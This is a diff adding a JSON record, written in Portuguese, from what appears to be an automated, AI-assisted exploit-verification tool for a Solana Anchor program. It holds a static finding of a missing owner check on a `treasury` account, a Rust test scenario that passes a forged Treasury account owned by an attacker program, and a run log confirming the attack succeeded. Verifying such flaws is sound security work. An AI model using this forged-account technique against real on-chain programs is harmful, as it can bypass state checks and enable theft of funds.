@@ -1,0 +1,115 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada com dono diferente foi aceita e usada",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2510,
+        "completion_tokens": 705,
+        "latency_s": 4.02
+      },
+      "raw": "{\n  \"plan\": \"O baseline inicializa uma conta Treasury legítima pertencente ao programa-alvo, com authority, balance e is_active=true, provando que o cenário está montado corretamente. O ataque repete a instrução `process`, mas substitui a conta treasury por uma conta forjada cujo dono é o programa do atacante e cujos dados imitam o layout de Treasury com is_active=true. Se o programa aceitar a conta forjada, o ataque terá sucesso; o efeito medido é que a conta forjada, com dono diferente do programa-alvo, foi usada e permaneceu com os dados forjados após a execução.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\n\\nlet treasury_data = anchor_account_data(\\\"Treasury\\\", &(authority, 1000u64, true));\\nlet treasury_account = account(&env.program_id, &treasury_data, None);\\n\\nlet baseline_ix = env.anchor_ix(\\\"process\\\", &(), vec![\\n    AccountMeta::new_readonly(treasury_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet baseline_accounts = vec![\\n    (treasury_key, treasury_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet baseline_result = env.baseline(\\\"process com treasury legitima\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\nlet forged_treasury_key = Pubkey::new_unique();\\nlet forged_treasury_data = anchor_account_data(\\\"Treasury\\\", &(authority, 999_999u64, true));\\nlet forged_treasury_account = account(&attacker_program, &forged_treasury_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\\"process\\\", &(), vec![\\n    AccountMeta::new_readonly(forged_treasury_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet attack_accounts = vec![\\n    (forged_treasury_key, forged_treasury_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process com treasury forjada de outro dono\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &forged_treasury_key);\\n    env.effect(\\n        \\\"conta forjada com dono diferente foi aceita e usada\\\",\\n        forged_after.owner() == &attacker_program\\n            && read_u64(forged_after.data(), 40) == 999_999u64\\n            && forged_after.data()[48] != 0,\\n    );\\n}\"\n}",
+      "plan": "O baseline inicializa uma conta Treasury legítima pertencente ao programa-alvo, com authority, balance e is_active=true, provando que o cenário está montado corretamente. O ataque repete a instrução `process`, mas substitui a conta treasury por uma conta forjada cujo dono é o programa do atacante e cujos dados imitam o layout de Treasury com is_active=true. Se o programa aceitar a conta forjada, o ataque terá sucesso; o efeito medido é que a conta forjada, com dono diferente do programa-alvo, foi usada e permaneceu com os dados forjados após a execução.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\n\nlet treasury_data = anchor_account_data(\"Treasury\", &(authority, 1000u64, true));\nlet treasury_account = account(&env.program_id, &treasury_data, None);\n\nlet baseline_ix = env.anchor_ix(\"process\", &(), vec![\n    AccountMeta::new_readonly(treasury_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet baseline_accounts = vec![\n    (treasury_key, treasury_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet baseline_result = env.baseline(\"process com treasury legitima\", &baseline_ix, &baseline_accounts);\n\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\nlet forged_treasury_key = Pubkey::new_unique();\nlet forged_treasury_data = anchor_account_data(\"Treasury\", &(authority, 999_999u64, true));\nlet forged_treasury_account = account(&attacker_program, &forged_treasury_data, None);\n\nlet attack_ix = env.anchor_ix(\"process\", &(), vec![\n    AccountMeta::new_readonly(forged_treasury_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet attack_accounts = vec![\n    (forged_treasury_key, forged_treasury_account),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process com treasury forjada de outro dono\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &forged_treasury_key);\n    env.effect(\n        \"conta forjada com dono diferente foi aceita e usada\",\n        forged_after.owner() == &attacker_program\n            && read_u64(forged_after.data(), 40) == 999_999u64\n            && forged_after.data()[48] != 0,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "process com treasury legitima",
+            "result": "Success",
+            "compute_units": 8487,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "cbdab63d16b4ffe9",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process com treasury forjada de outro dono",
+            "result": "Success",
+            "compute_units": 8503,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "037c9a3195f5d99f",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada com dono diferente foi aceita e usada",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8487 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8503 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada com dono diferente foi aceita e usada"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "pub treasury: AccountInfo<'info>,\n...\nlet data = ctx.accounts.treasury.try_borrow_data()?;",
+    "explanation": "A conta `treasury` e recebida como `AccountInfo` e seus dados sao lidos diretamente via `try_borrow_data()` sem qualquer verificacao de que `treasury.owner` seja o programa atual. Diferente do tipo `Account<'info, T>`, o `AccountInfo` nao valida o proprietario, permitindo que uma conta forjada, pertencente a outro programa, seja passada com dados arbitrarios.",
+    "attack_hypothesis": "Um atacante cria uma conta cujo proprietario e um programa malicioso (ou qualquer programa que ele controle) e grava bytes que imitam o layout de `Treasury` (authority, balance, is_active = true). Ao passar essa conta como `treasury` na instrucao `process`, o programa le os dados forjados sem perceber que a conta nao pertence ao programa, contornando a validacao de estado."
+  }
+}
